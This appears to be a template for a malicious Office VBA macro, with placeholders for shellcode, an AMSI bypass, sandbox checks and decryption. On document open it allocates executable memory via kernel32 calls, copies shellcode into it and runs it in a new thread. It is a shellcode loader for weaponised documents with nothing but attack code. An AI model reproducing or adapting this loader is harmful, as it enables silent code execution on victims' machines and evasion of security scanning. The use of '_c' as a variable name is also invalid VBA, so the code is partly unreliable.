Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal sz As Long, ByVal flAllocType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal sz As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpSec As Long, ByVal dwStack As Long, ByVal lpStart As LongPtr, lpParam As Long, ByVal dwFlags As Long, lpThreadId As Long) As LongPtr
{{ vba_amsi_declares }}

Sub AutoOpen()
    Payload
End Sub

Sub Document_Open()
    Payload
End Sub

Private Sub Payload()
{{ sandbox_block }}
{{ amsi_block }}
    Dim enc As Variant
    buf = Array({{ shellcode }})
{{ decrypt_block }}

    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)

    Dim b() As Byte
    ReDim b(UBound(buf))
    Dim _c As Long
    For _c = 0 To UBound(buf)
        b(_c) = buf(_c)
    Next

    RtlMoveMemory addr, b(0), UBound(buf) + 1
    CreateThread 0, 0, addr, 0, 0, 0
End Sub
